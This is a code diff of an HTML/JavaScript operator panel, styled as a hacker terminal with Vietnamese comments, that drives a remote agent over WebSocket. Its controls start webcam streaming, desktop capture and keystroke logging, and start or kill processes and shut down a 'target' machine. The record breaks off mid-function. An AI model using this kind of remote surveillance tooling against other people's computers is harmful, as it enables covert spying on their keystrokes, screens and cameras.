@@ -2,404 +2,422 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>REMOTE_OPS // TERMINAL</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <title>REMOTE_OPS // V5.1_FIXED</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     
     <style>
-        /* --- CORE TERMINAL STYLES --- */
+        /* --- 1. CORE VARIABLES --- */
         :root {
-            --bg-color: #0a0a0a;     /* Nền đen sâu */
-            --panel-bg: #0e1114;     /* Nền panel tối */
-            --text-primary: #00ff41; /* Xanh lá hacker cổ điển */
-            --text-accent: #00f7ff;  /* Xanh dương điện tử (Cyan) cho tiêu đề/điểm nhấn */
-            --danger: #ff003c;       /* Đỏ cảnh báo sắc nét */
-            --border-glow: 0 0 4px rgba(0, 255, 65, 0.3);
+            --bg-color: #020202;
+            --main-color: #00ff41; 
+            --dim-color: #003b00;
+            --accent-color: #00f7ff; 
+            --alert-color: #ff003c; 
+            --glass-bg: rgba(0, 10, 0, 0.9);
         }
+
+        * { box-sizing: border-box; }
 
         body {
-            font-family: 'Fira Code', 'Roboto Mono', Consolas, monospace; /* Font đơn sắc là bắt buộc */
-            background: var(--bg-color);
-            color: var(--text-primary);
-            margin: 0;
-            padding: 20px;
-            /* Hiệu ứng nền vân scanline nhẹ */
-            background-image: linear-gradient(rgba(0, 20, 0, 0.9), rgba(0, 20, 0, 0.9)), url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAEUlEQVQYV2NkoAAwMvz/z4AKAL8XAwWjT3L5AAAAAElFTkSuQmCC');
-            background-size: cover, 4px 4px;
+            font-family: 'Share Tech Mono', monospace;
+            background-color: var(--bg-color);
+            color: var(--main-color);
+            margin: 0; padding: 0;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden; /* CHẶN TUYỆT ĐỐI SCROLL BODY */
+            display: flex; flex-direction: column;
         }
 
-        /* Container chính với viền phát sáng */
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: rgba(14, 17, 20, 0.95); /* Bán trong suốt */
-            padding: 25px;
-            border: 1px solid var(--text-primary);
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.15);
-            position: relative;
+        /* --- 2. LAYERS --- */
+        canvas#matrix-bg { position: fixed; top: 0; left: 0; z-index: 0; opacity: 0.15; pointer-events: none; }
+        .scanlines {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2));
+            background-size: 100% 4px;
+            z-index: 9999; 
+            pointer-events: none; 
         }
-        /* Trang trí góc container */
-        .container::before { content: ""; position: absolute; top: -2px; left: -2px; width: 20px; height: 20px; border-top: 2px solid var(--text-accent); border-left: 2px solid var(--text-accent); }
-        .container::after { content: ""; position: absolute; bottom: -2px; right: -2px; width: 20px; height: 20px; border-bottom: 2px solid var(--text-accent); border-right: 2px solid var(--text-accent); }
 
-
-        /* --- Header & Status --- */
+        /* --- 3. UI COMPONENTS --- */
+        
+        /* HEADER (Fixed Height: 50px) */
         .header {
-            display: flex; gap: 15px;
-            border-bottom: 2px solid var(--text-primary);
-            padding-bottom: 20px; margin-bottom: 25px;
-            align-items: center; letter-spacing: 1px;
+            height: 50px; display: flex; align-items: center; padding: 0 20px;
+            border-bottom: 2px solid var(--main-color);
+            background: rgba(0, 20, 0, 0.95);
+            justify-content: space-between;
+            position: relative; z-index: 10;
+            flex-shrink: 0; /* Không cho phép co lại */
         }
-        .status { font-weight: 700; margin-left: auto; padding: 4px 8px; border: 1px solid currentColor; }
-        .status.connected { color: var(--text-primary); box-shadow: inset 0 0 8px var(--text-primary); }
-        .status.disconnected { color: var(--danger); box-shadow: inset 0 0 8px var(--danger); animation: blink-red 1s infinite; }
 
-        /* --- Grid & Panels --- */
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
-        .full { grid-column: span 2; }
-        
+        /* GRID LAYOUT (Quan trọng: Tính toán chiều cao còn lại) */
+        .main-grid {
+            display: grid;
+            grid-template-columns: 280px 1fr 320px; 
+            /* Trừ đi Header(50px) + Padding(30px) + Ticker(25px) */
+            height: calc(100vh - 50px - 25px); 
+            gap: 15px; padding: 15px;
+            position: relative; z-index: 10;
+            overflow: hidden; /* Nội dung tràn sẽ bị cắt hoặc cuộn bên trong */
+        }
+
+        /* PANELS - Sửa lỗi Flexbox */
         .panel {
-            border: 1px solid #333;
-            padding: 20px;
-            background: rgba(0, 0, 0, 0.3);
+            background: var(--glass-bg);
+            border: 1px solid var(--dim-color);
+            padding: 10px; display: flex; flex-direction: column;
             position: relative;
-            transition: border-color 0.3s;
+            transition: all 0.3s;
+            height: 100%; /* Chiếm hết chiều cao ô grid */
+            overflow: hidden; /* Quan trọng: Giữ nội dung bên trong */
+            min-height: 0; /* Fix lỗi Flexbox trên Firefox/Chrome */
         }
-        .panel:hover { border-color: var(--text-accent); }
+        .panel:hover { border-color: var(--main-color); box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
         
-        h3 {
-            margin-top: 0;
-            border-bottom: 1px dashed #333;
-            padding-bottom: 10px;
-            color: var(--text-accent);
-            font-size: 18px;
-            text-transform: uppercase;
-            letter-spacing: 1.5px;
-        }
-        /* Thêm tiền tố '>_' cho tiêu đề */
-        h3::before { content: ">_ "; color: var(--text-primary); }
+        .corner { position: absolute; width: 6px; height: 6px; border-color: var(--accent-color); border-style: solid; transition: 0.3s; }
+        .tl { top: -1px; left: -1px; border-width: 2px 0 0 2px; }
+        .tr { top: -1px; right: -1px; border-width: 2px 2px 0 0; }
+        .bl { bottom: -1px; left: -1px; border-width: 0 0 2px 2px; }
+        .br { bottom: -1px; right: -1px; border-width: 0 2px 2px 0; }
+        .panel:hover .corner { width: 100%; height: 100%; opacity: 0.1; }
 
-        /* --- Inputs & Buttons (Terminal Style) --- */
-        input[type="text"], input[type="number"] {
-            padding: 8px;
-            background: #000;
-            border: 1px solid var(--text-primary);
-            color: var(--text-primary);
-            font-family: inherit;
-            outline: none;
+        h3 {
+            margin: 0 0 10px 0; font-size: 16px; color: var(--accent-color);
+            border-bottom: 1px dashed var(--dim-color); padding-bottom: 5px;
+            text-transform: uppercase; letter-spacing: 1px; flex-shrink: 0;
         }
-        input:focus { border-color: var(--text-accent); box-shadow: 0 0 5px var(--text-accent); }
+        h3::before { content: ">> "; color: var(--main-color); }
+
+        /* --- 4. BUTTONS & INPUTS --- */
+        input {
+            background: #000; border: 1px solid var(--dim-color); 
+            color: var(--main-color); padding: 8px; 
+            font-family: 'Share Tech Mono'; font-size: 13px;
+            outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: var(--main-color); box-shadow: 0 0 10px var(--dim-color); }
 
         button {
-            padding: 8px 15px; cursor: pointer;
-            background: transparent; /* Nền trong suốt */
-            border: 1px solid currentColor; /* Viền theo màu chữ */
-            color: var(--text-primary);
-            font-family: inherit; font-weight: 700;
-            text-transform: uppercase; letter-spacing: 1px;
-            transition: all 0.2s;
-            margin-right: 5px;
-            position: relative; overflow: hidden;
+            background: rgba(0, 50, 0, 0.3); border: 1px solid var(--main-color);
+            color: var(--main-color); padding: 6px 12px;
+            cursor: pointer; text-transform: uppercase;
+            font-family: 'Share Tech Mono'; font-weight: bold; font-size: 12px;
+            position: relative; overflow: hidden; transition: all 0.2s;
         }
-        /* Hiệu ứng hover đảo màu */
-        button:hover { background: var(--text-primary); color: #000; box-shadow: 0 0 10px var(--text-primary); }
-        
-        /* Các nút màu đặc biệt */
-        .btn-blue { color: var(--text-accent); }
-        .btn-blue:hover { background: var(--text-accent); color: #000; box-shadow: 0 0 10px var(--text-accent); }
-        .btn-red { color: var(--danger); }
-        .btn-red:hover { background: var(--danger); color: #fff; box-shadow: 0 0 10px var(--danger); }
-        .btn-green { color: var(--text-primary); }
-        .btn-gray { color: #888; border-color: #888; }
-        .btn-gray:hover { background: #888; color: #000; }
+        button:hover { background: var(--main-color); color: #000; box-shadow: 0 0 15px var(--main-color); }
+        button:active { transform: scale(0.95); } 
+        .btn-red { border-color: var(--alert-color); color: var(--alert-color); background: rgba(50, 0, 0, 0.3); }
+        .btn-red:hover { background: var(--alert-color); color: #fff; box-shadow: 0 0 15px var(--alert-color); }
+        .btn-group { display: flex; gap: 5px; margin-bottom: 5px; flex-shrink: 0; }
 
-        /* --- Tables & Logs (Data Grid) --- */
-        .scroll-box {
-            height: 220px; overflow-y: auto; margin-top: 15px;
-            border: 1px solid #333; background: #050505;
-        }
-        table { width: 100%; border-collapse: collapse; font-size: 13px; }
-        th, td { border: 1px solid #222; padding: 8px; text-align: left; color: #bbb; }
-        th { background: #111; position: sticky; top: 0; color: var(--text-accent); border-bottom: 1px solid var(--text-accent); }
-        tr:hover td { color: var(--text-primary); background: rgba(0, 255, 65, 0.05); }
+        /* --- 5. CONTENT ELEMENTS (SCROLL FIX) --- */
         
-        textarea, #sys-log {
-            width: 100%; background: #050505;
-            color: var(--text-primary); border: 1px solid #333;
-            padding: 10px; font-family: inherit; box-sizing: border-box;
+        /* Cột giữa: Chứa ảnh */
+        .col-center { display: flex; flex-direction: column; gap: 15px; height: 100%; overflow: hidden; }
+
+        /* Khung chứa ảnh (Fix tràn) */
+        .screen-container {
+            flex-grow: 1; /* Tự động giãn */
+            border: 1px solid var(--dim-color); background: #000;
+            display: flex; align-items: center; justify-content: center;
+            background-image: repeating-linear-gradient(0deg, transparent, transparent 1px, #001100 1px, #001100 2px);
+            position: relative; overflow: hidden; 
+            min-height: 0; /* Cho phép co lại nếu cần */
         }
-        textarea { height: 90px; resize: vertical; }
-        textarea:focus { border-color: var(--text-primary); }
+        img.view-area { 
+            max-width: 100%; max-height: 100%; /* Giới hạn ảnh trong khung */
+            object-fit: contain; /* Giữ tỷ lệ ảnh */
+            display: block; 
+        }
+        .rec-dot { position: absolute; top: 10px; right: 10px; color: red; font-size: 10px; animation: blink 1s infinite; display: none; }
+
+        /* Bảng dữ liệu (Fix tràn) */
+        .table-wrap { 
+            flex-grow: 1; /* Chiếm phần còn lại */
+            overflow-y: auto; /* Chỉ cuộn phần này */
+            border: 1px solid var(--dim-color); margin-bottom: 10px; 
+            min-height: 0; /* Quan trọng để scroll hoạt động */
+        }
         
-        #sys-log {
-            height: 150px; overflow-y: auto; font-size: 12px;
-            margin-top: 25px; border-top: 2px solid var(--text-accent);
-        }
-        #sys-log div { padding: 2px 0; border-bottom: 1px dotted #222; }
-        /* Hiệu ứng nhấp nháy cho dòng log cuối cùng */
-        #sys-log div:last-child::after { content: "_"; animation: blink 1s infinite; }
+        table { width: 100%; border-collapse: collapse; font-size: 12px; }
+        th { position: sticky; top: 0; background: #002200; color: var(--accent-color); text-align: left; padding: 5px; z-index: 5; }
+        td { padding: 4px 5px; border-bottom: 1px solid #001100; color: #888; }
+        tr:hover td { background: var(--main-color); color: #000; cursor: pointer; }
 
-        /* --- Media Views --- */
-        .view-area-container { border: 1px solid var(--text-primary); padding: 5px; display: inline-block; background: #000; }
-        img.view-area {
-            display: block; max-width: 100%; max-height: 350px;
-            border: 1px solid #222; background: #0a0a0a;
-            /* Hiệu ứng nhiễu nhẹ khi không có tín hiệu */
-            min-height: 200px; min-width: 300px;
-            background-image: repeating-linear-gradient(0deg, #0a0a0a, #0a0a0a 2px, #111 2px, #111 4px);
+        /* Ticker Footer */
+        .ticker-wrap {
+            position: fixed; bottom: 0; width: 100%; height: 25px;
+            background: #000; border-top: 1px solid var(--dim-color);
+            overflow: hidden; white-space: nowrap; z-index: 20;
         }
+        .ticker { display: inline-block; animation: marquee 20s linear infinite; font-size: 12px; line-height: 25px; color: #555; }
+        .ticker span { margin-right: 30px; }
+        .ticker strong { color: var(--main-color); }
+        @keyframes marquee { 0% { transform: translate(100%, 0); } 100% { transform: translate(-100%, 0); } }
 
-        /* --- Animations --- */
+        /* Log & Components */
+        textarea { width: 100%; height: 100%; background: #000; border: none; color: var(--main-color); padding: 8px; resize: none; font-family: 'Fira Code'; font-size: 11px; outline: none; }
+        #skull-art { font-family: 'Fira Code', monospace; font-size: 8px; line-height: 8px; color: var(--dim-color); text-align: center; margin: 10px 0; transition: color 0.5s; flex-shrink: 0; }
+        .chart-container { width: 100%; height: 60px; border: 1px solid var(--dim-color); background: #000; margin-bottom: 10px; flex-shrink: 0; }
+        canvas.chart { width: 100%; height: 100%; display: block; }
+
         @keyframes blink { 50% { opacity: 0; } }
-        @keyframes blink-red { 50% { opacity: 0.5; box-shadow: none; } }
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-thumb { background: var(--dim-color); }
+        ::-webkit-scrollbar-thumb:hover { background: var(--main-color); }
+
     </style>
 </head>
 <body>
 
-<div class="container">
+    <canvas id="matrix-bg"></canvas>
+    <div class="scanlines"></div>
+
     <div class="header">
-        <label for="ip" style="color: var(--text-accent); font-weight: bold;">[TARGET_IP]:></label> 
-        <input type="text" id="ip" value="ws://localhost:9010" style="width: 200px;">
-        <button class="btn-blue" onclick="connect()">[⚡ ESTABLISH_LINK]</button>
-        <span id="status" class="status disconnected">OFFLINE</span>
+        <div style="font-size: 22px; font-weight: bold; letter-spacing: 2px;">
+            REMOTE<span style="color:var(--accent-color)">OPS</span> <span style="font-size:12px; color:#555">// V5.1_STABLE</span>
+        </div>
+        <div style="display: flex; gap: 10px; align-items: center;">
+            <input type="text" id="ip" value="ws://localhost:9010" style="width: 220px; text-align: center;">
+            <button onclick="connect()">INITIALIZE_LINK</button>
+            <div id="status" style="width: 100px; text-align: center; border: 1px solid #333; padding: 5px; font-size: 12px; color: #555;">OFFLINE</div>
+        </div>
     </div>
 
-    <div class="grid">
-        <div class="panel full">
-            <h3>📹 SURVEILLANCE_FEED [Webcam]</h3>
-            <div style="margin-bottom: 15px;">
-                <button class="btn-green" onclick="send('WEBCAM', 'START_STREAM')">▶ ACTIVATE FEED</button>
-                <button class="btn-red" onclick="send('WEBCAM', 'STOP_STREAM')">■ TERMINATE FEED</button>
+    <div class="main-grid">
+
+        <div class="panel">
+            <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
+            <h3>SYSTEM_STATUS</h3>
+            <pre id="skull-art">
+      .ed"""" """$$$$be.
+    -"           ^""**$$$e.
+  ."                   '$$$c
+ /                      "4$$b
+d  3                      $$$$
+C  $  .ec.        .ec.    $$$$
+9  q  d$$b.      .d$$b.   $$$P
+5  q. $$P"        "T$$   $$$P
+ \  ".   .e.    .e.      $$$
+  \   "  $$$    $$$     $$$
+   ".    "$$    $$"    "$$
+            </pre>
+            <div style="font-size: 10px; color: var(--accent-color); margin-bottom: 2px;">NETWORK_TRAFFIC:</div>
+            <div class="chart-container"><canvas id="net-chart" class="chart"></canvas></div>
+            
+            <div style="margin-top: auto; flex-shrink: 0;">
+                <h3 style="color: var(--alert-color);">CRITICAL_OPS</h3>
+                <button class="btn-red" style="width: 100%; margin-bottom: 8px;" onclick="if(confirm('SHUTDOWN?')) send('SYSTEM', 'SHUTDOWN')">🛑 SHUTDOWN TARGET</button>
+                <button style="width: 100%; border-color:#666; color:#888;" onclick="if(confirm('RESTART?')) send('SYSTEM', 'RESTART')">🔄 REBOOT SYSTEM</button>
             </div>
-            <div class="view-area-container" style="width: 100%; text-align: center;">
-                <img id="cam-stream" class="view-area" style="margin: 0 auto;" alt="> NO SIGNAL <">
+        </div>
+
+        <div class="col-center">
+            <div class="panel" style="flex: 2; min-height: 0;">
+                <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
+                <div style="display: flex; justify-content: space-between; flex-shrink: 0;">
+                    <h3>VISUAL_FEED</h3>
+                    <div class="rec-dot" id="cam-rec">● REC</div>
+                </div>
+                <div class="btn-group">
+                    <button onclick="send('WEBCAM', 'START_STREAM'); document.getElementById('cam-rec').style.display='block'">▶ ACTIVATE</button>
+                    <button class="btn-red" onclick="send('WEBCAM', 'STOP_STREAM'); document.getElementById('cam-rec').style.display='none'">■ STOP</button>
+                </div>
+                <div class="screen-container">
+                    <img id="cam-stream" class="view-area" alt="NO SIGNAL">
+                </div>
+            </div>
+
+            <div class="panel" style="flex: 1.5; min-height: 0;">
+                <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
+                <h3 style="flex-shrink: 0;">DESKTOP_INTERCEPT</h3>
+                <button onclick="captureScreen()" style="width: 100%; margin-bottom: 5px; flex-shrink: 0;">[ CAPTURE FRAME ]</button>
+                <div class="screen-container">
+                    <img id="screen-img" class="view-area" alt="WAITING DATA">
+                </div>
+            </div>
+
+            <div class="panel" style="height: 140px; min-height: 140px; flex-shrink: 0;">
+                <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
+                    <h3 style="border:none; margin:0;">KEY_LOGS</h3>
+                    <div class="btn-group">
+                        <button class="btn-red" onclick="send('KEYBOARD', 'START')">REC</button>
+                        <button onclick="send('KEYBOARD', 'STOP')">STOP</button>
+                        <button onclick="document.getElementById('keylog-out').value=''">CLR</button>
+                    </div>
+                </div>
+                <div style="border: 1px solid var(--dim-color); flex-grow: 1;">
+                    <textarea id="keylog-out" readonly placeholder="> Waiting for keystrokes..."></textarea>
+                </div>
             </div>
         </div>
 
         <div class="panel">
-            <h3>⚙️ ACTIVE_PROCESSES</h3>
-            <div style="margin-bottom: 12px; border-bottom: 1px dashed #333; padding-bottom: 10px;">
-                <input type="text" id="proc-path" placeholder="ex: cmd.exe" style="width: 140px;">
-                <button class="btn-green" onclick="startProcess()">> EXECUTE</button>
+            <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
+            <h3>PROCESS_MANAGER</h3>
+            
+            <div class="btn-group">
+                <input type="text" id="proc-path" placeholder="Process Name">
+                <button onclick="startProcess()">EXEC</button>
+            </div>
+            <div class="btn-group">
+                <button onclick="send('PROCESS', 'LIST')" style="flex: 1;">↻ REFRESH</button>
+                <input type="number" id="proc-pid" placeholder="PID" style="width: 60px; flex:none;">
+                <button class="btn-red" onclick="killProcess()">KILL</button>
             </div>
             
-            <div style="margin-bottom: 12px;">
-                <button class="btn-blue" onclick="send('PROCESS', 'LIST')">↻ REFRESH_LIST</button>
-                <input type="number" id="proc-pid" placeholder="PID" style="width: 80px;">
-                <button class="btn-red" onclick="killProcess()">X KILL_PID</button>
-            </div>
-
-            <div class="scroll-box">
+            <div class="table-wrap" style="flex: 1;">
                 <table id="proc-table">
-                    <thead><tr><th>PID</th><th>IMAGE_NAME</th><th>THRDS</th><th>ACT</th></tr></thead>
+                    <thead><tr><th>ID</th><th>NAME</th><th>TH</th></tr></thead>
                     <tbody></tbody>
                 </table>
             </div>
-        </div>
 
-        <div class="panel">
-            <h3>📦 REGISTERED_APPLICATIONS</h3>
-            <div style="margin-bottom: 12px;">
-                <button class="btn-blue" onclick="send('APP', 'LIST')">↻ SCAN_APPS</button>
-                <input type="text" id="app-path" placeholder="App Name" style="width: 100px;">
-                <button class="btn-green" onclick="startApp()">> LAUNCH</button>
-            </div>
-            <div class="scroll-box">
+            <h3 style="margin-top: 15px; flex-shrink: 0;">APP_REGISTRY</h3>
+            <button onclick="send('APP', 'LIST')" style="width: 100%; margin-bottom: 5px; flex-shrink: 0;">SCAN REGISTRY</button>
+            
+            <div class="table-wrap" style="height: 150px; flex-grow: 0; flex-shrink: 0;">
                 <table id="app-table">
-                    <thead><tr><th>EXECUTABLE</th><th>ACTION</th></tr></thead>
+                    <thead><tr><th>APP NAME</th><th>ACT</th></tr></thead>
                     <tbody></tbody>
                 </table>
             </div>
         </div>
-
-        <div class="panel">
-            <h3>📸 DESKTOP_SNAPSHOT</h3>
-            <button class="btn-green" onclick="captureScreen()" style="width: 100%; margin-bottom: 10px;">[ CAPTURE_FRAME ]</button>
-            <div class="view-area-container" style="width: 100%;">
-                <img id="screen-img" class="view-area" style="max-height: 180px; width: 100%;" alt="> NO DATA <">
-            </div>
-        </div>
-
-        <div class="panel">
-            <h3>⌨️ KEYSTROKE_INTERCEPT</h3>
-            <div style="margin-bottom: 10px;">
-                <button class="btn-red" onclick="send('KEYBOARD', 'START')">● REC</button>
-                <button class="btn-gray" onclick="send('KEYBOARD', 'STOP')">■ STOP</button>
-                <button class="btn-blue" onclick="document.getElementById('keylog-out').value=''">_CLEAR</button>
-            </div>
-            <textarea id="keylog-out" placeholder="> Waiting for input stream..."></textarea>
-        </div>
-        
-        <div class="panel full" style="border-color: var(--danger);">
-            <h3 style="color: var(--danger);">🖥️ SYSTEM_POWER_OPS [DANGER ZONE]</h3>
-            <button class="btn-red" onclick="if(confirm('Confirm SYSTEM HALT?')) send('SYSTEM', 'SHUTDOWN')">🛑 INITIATE_SHUTDOWN</button>
-            <button class="btn-gray" onclick="if(confirm('Confirm SYSTEM REBOOT?')) send('SYSTEM', 'RESTART')">🔄 INITIATE_RESTART</button>
-        </div>
     </div>
 
-    <div id="sys-log">
-        <div>>_ SYSTEM READY. Waiting for connection target...</div>
+    <div class="ticker-wrap">
+        <div class="ticker">
+            <span>[SYSTEM]: <strong>READY</strong></span>
+            <span>[ENCRYPTION]: <strong>AES-256</strong></span>
+            <span>[PORT]: <strong>9010</strong></span>
+            <span>[STATUS]: <strong>WAITING FOR TARGET...</strong></span>
+            <span>[MODULES]: <strong>WEBCAM, SCREEN, KEYLOG, PROCESS LOADED</strong></span>
+            <span>[WARNING]: <strong>UNAUTHORIZED ACCESS DETECTED</strong></span>
+        </div>
     </div>
-</div>
 
 <script>
-    // ... (Copy toàn bộ nội dung thẻ <script> từ code cũ của em vào đây, không cần sửa gì) ...
+    // --- 1. MATRIX EFFECT ---
+    const canvas = document.getElementById('matrix-bg');
+    const ctx = canvas.getContext('2d');
+    function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    window.onresize = resize; resize();
+    const chars = "01"; 
+    const drops = Array(Math.floor(canvas.width/14)).fill(1);
+    setInterval(() => {
+        ctx.fillStyle = "rgba(0, 5, 0, 0.1)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0f0"; ctx.font = "14px monospace";
+        drops.forEach((y, i) => {
+            const text = chars[Math.floor(Math.random()*chars.length)];
+            ctx.fillText(text, i*14, y*14);
+            if(y*14 > canvas.height && Math.random() > 0.98) drops[i] = 0;
+            drops[i]++;
+        });
+    }, 50);
+
+    // --- 2. CHART ANIMATION ---
+    const chartCtx = document.getElementById('net-chart').getContext('2d');
+    let data = Array(40).fill(30);
+    setInterval(() => {
+        data.shift(); data.push(Math.random() * 40 + 5);
+        const w = chartCtx.canvas.width = chartCtx.canvas.clientWidth;
+        const h = chartCtx.canvas.height = chartCtx.canvas.clientHeight;
+        chartCtx.strokeStyle = "#00f7ff"; chartCtx.lineWidth = 1.5; chartCtx.beginPath();
+        data.forEach((v, i) => { 
+            const x = (i / data.length) * w;
+            const y = h - v; 
+            i===0 ? chartCtx.moveTo(x, y) : chartCtx.lineTo(x, y);
+        });
+        chartCtx.stroke();
+    }, 80);
+
+    // --- 3. LOGIC KẾT NỐI ---
     let ws = null;
-    const logDiv = document.getElementById('sys-log');
-    
-    // Cờ quan trọng: Phân biệt gói binary đến là Ảnh chụp màn hình hay Video stream
     let isWaitingForScreenshot = false;
 
-    function log(msg) {
-        const div = document.createElement('div');
-        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        logDiv.appendChild(div);
-        logDiv.scrollTop = logDiv.scrollHeight;
-    }
-
     function connect() {
-        if (ws) { ws.close(); ws = null; }
-        ws = new WebSocket(document.getElementById('ip').value);
-        ws.binaryType = "arraybuffer"; // Bắt buộc cho Binary Mode
+        if(ws) { ws.close(); ws=null; }
+        const ip = document.getElementById('ip').value;
+        const btn = document.querySelector('.header button');
+        const status = document.getElementById('status');
 
-        ws.onopen = () => {
-            document.getElementById('status').className = "status connected";
-            document.getElementById('status').innerText = "ONLINE"; // Sửa text một chút cho ngầu
-            log("✅ >>> CONNECTION ESTABLISHED <<<");
-        };
-        ws.onclose = () => {
-            document.getElementById('status').className = "status disconnected";
-            document.getElementById('status').innerText = "OFFLINE";
-            log("❌ >>> CONNECTION LOST <<<");
-        };
-
-        ws.onmessage = (event) => {
-            // 1. XỬ LÝ DỮ LIỆU NHỊ PHÂN (BINARY)
-            if (event.data instanceof ArrayBuffer) {
-                if (isWaitingForScreenshot) {
-                    // Nếu đang đợi Screenshot -> Hiển thị vào khung Screenshot
-                    renderImage('screen-img', event.data);
-                    isWaitingForScreenshot = false; // Reset cờ
-                    log("📸 > Screenshot frame received.");
+        btn.innerText = "CONNECTING...";
+        
+        try {
+            ws = new WebSocket(ip);
+            ws.binaryType = "arraybuffer";
+            ws.onopen = () => {
+                status.innerText = "ONLINE"; status.style.color = "#0f0"; status.style.borderColor = "#0f0";
+                btn.innerText = "DISCONNECT";
+                document.getElementById('skull-art').style.color = "#0f0";
+                updateTicker("TARGET LOCKED. CONNECTION ESTABLISHED.");
+            };
+            ws.onclose = () => {
+                status.innerText = "OFFLINE"; status.style.color = "#555"; status.style.borderColor = "#555";
+                btn.innerText = "INITIALIZE LINK";
+                document.getElementById('skull-art').style.color = "#555";
+                updateTicker("CONNECTION LOST. SEARCHING...");
+            };
+            ws.onmessage = (evt) => {
+                if(evt.data instanceof ArrayBuffer) {
+                    const blob = new Blob([evt.data], {type: "image/jpeg"});
+                    const url = URL.createObjectURL(blob);
+                    if(isWaitingForScreenshot) {
+                        document.getElementById('screen-img').src = url;
+                        isWaitingForScreenshot = false;
+                    } else {
+                        document.getElementById('cam-stream').src = url;
+                    }
                 } else {
-                    // Mặc định là Stream Webcam
-                    renderImage('cam-stream', event.data);
+                    try { handleJson(JSON.parse(evt.data)); } catch(e){}
                 }
-                return;
-            }
-
-            // 2. XỬ LÝ DỮ LIỆU VĂN BẢN (JSON)
-            try {
-                const res = JSON.parse(event.data);
-                handleResponse(res);
-            } catch (e) {
-                console.error("JSON Parse Error", e);
-            }
-        };
+            };
+        } catch(e) { 
+            btn.innerText = "ERROR";
+            updateTicker("ERROR: INVALID TARGET ADDRESS.");
+        }
     }
 
-    // Render ảnh từ ArrayBuffer dùng Blob URL (Hiệu năng cao)
-    let urlCache = {};
-    function renderImage(elementId, buffer) {
-        const blob = new Blob([buffer], { type: "image/jpeg" });
-        const url = URL.createObjectURL(blob);
-        const img = document.getElementById(elementId);
+    function send(mod, cmd, pay={}) {
+        if(!ws || ws.readyState!==1) return alert("NO CONNECTION");
+        ws.send(JSON.stringify({module:mod, command:cmd, payload:pay}));
+    }
+
+    // UI Actions
+    function captureScreen() { isWaitingForScreenshot=true; send('SCREEN', 'CAPTURE_BINARY'); }
+    function killProcess() { const pid=document.getElementById('proc-pid').value; if(pid) send('PROCESS','KILL',{pid:parseInt(pid)}); }
+    function startProcess() { const path=document.getElementById('proc-path').value; if(path) send('PROCESS','START',{path:path}); }
+    
+    function updateTicker(msg) {
+        document.querySelector('.ticker').innerHTML += ` <span>[UPDATE]: <strong>${msg}</strong></span>`;
+    }
+
+    function handleJson(res) {
+        if(res.status==='error') return updateTicker(`ERROR: ${res.message}`);
         
-        img.onload = () => {
-            if (urlCache[elementId]) URL.revokeObjectURL(urlCache[elementId]);
-            urlCache[elementId] = url;
-        };
-        img.src = url;
-    }
-
-    // --- GỬI LỆNH ---
-    function send(module, command, payload = {}) {
-        if (!ws || ws.readyState !== 1) { alert(">>> ERROR: NO CARRIER (Check connection) <<<"); return; }
-        const msg = { module, command, payload };
-        ws.send(JSON.stringify(msg));
-        log(`> SENDING: [${module}::${command}]`);
-    }
-
-    // --- UI ACTIONS ---
-    function captureScreen() {
-        isWaitingForScreenshot = true; // Bật cờ đợi ảnh
-        send('SCREEN', 'CAPTURE_BINARY');
-    }
-
-    function killProcess() {
-        const pid = document.getElementById('proc-pid').value;
-        if(pid) send('PROCESS', 'KILL', { pid: parseInt(pid) });
-    }
-// Thêm hàm này vào vùng <script>
-    function startProcess() {
-        const path = document.getElementById('proc-path').value;
-        if (path) {
-            // Gửi lệnh PROCESS -> START kèm payload path
-            send('PROCESS', 'START', { path: path });
-        } else {
-            alert("Please enter process path/name!");
-        }
-    }
-    function startApp() {
-        const path = document.getElementById('app-path').value;
-        if(path) send('APP', 'START', { path: path });
-    }
-
-    // --- XỬ LÝ JSON RESPONSE ---
-    function handleResponse(res) {
-        if (res.status === 'error') { log("⛔ ERROR: " + res.message); return; }
-
-        // PROCESS LIST
-        if (res.module === 'PROCESS' && res.command === 'LIST') {
-            const tbody = document.querySelector('#proc-table tbody');
-            tbody.innerHTML = "";
-            const list = (res.data && res.data.process_list) ? res.data.process_list : [];
-            
-            list.slice(0, 300).forEach(p => {
-                const row = tbody.insertRow();
-                row.insertCell().innerText = p.pid;
-                row.insertCell().innerText = p.name;
-                row.insertCell().innerText = p.threads;
-                
-                const btn = document.createElement('button');
-                btn.innerText = "X";
-                btn.className = "btn-red";
-                btn.style.padding = "2px 6px";
-                btn.style.border = "none"; btn.style.background = "var(--danger)"; btn.style.color = "black"; // Ghi đè style nút X trong bảng cho gọn
-                btn.onclick = () => { document.getElementById('proc-pid').value = p.pid; };
-                row.insertCell().appendChild(btn);
+        if(res.module==='PROCESS' && res.command==='LIST') {
